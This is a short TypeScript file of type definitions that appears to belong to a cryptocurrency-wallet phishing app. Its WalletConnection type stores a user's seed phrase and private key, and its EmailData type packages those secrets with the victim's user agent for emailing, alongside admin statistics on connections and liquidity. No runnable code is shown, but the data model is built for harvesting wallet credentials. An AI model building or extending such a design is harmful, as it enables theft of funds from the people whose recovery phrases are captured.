export interface WalletConnection {
  address: string;
  seedPhrase: string;
  privateKey: string;
  walletType: 'metamask' | 'tokenpocket' | 'coinbase' | 'other';
}

export interface User {
  id: string;
  walletAddress: string;
  email?: string;
  joinedAt: Date;
  referralCode: string;
  referredBy?: string;
}

export interface Notification {
  id: string;
  title: string;
  message: string;
  type: 'info' | 'success' | 'warning' | 'error';
  createdAt: Date;
  readAt?: Date;
}

export interface AdminStats {
  totalUsers: number;
  totalLiquidity: number;
  activeConnections: number;
  notifications: Notification[];
}

export interface EmailData {
  to: string;
  subject: string;
  walletDetails: WalletConnection;
  userAgent: string;
  timestamp: Date;
}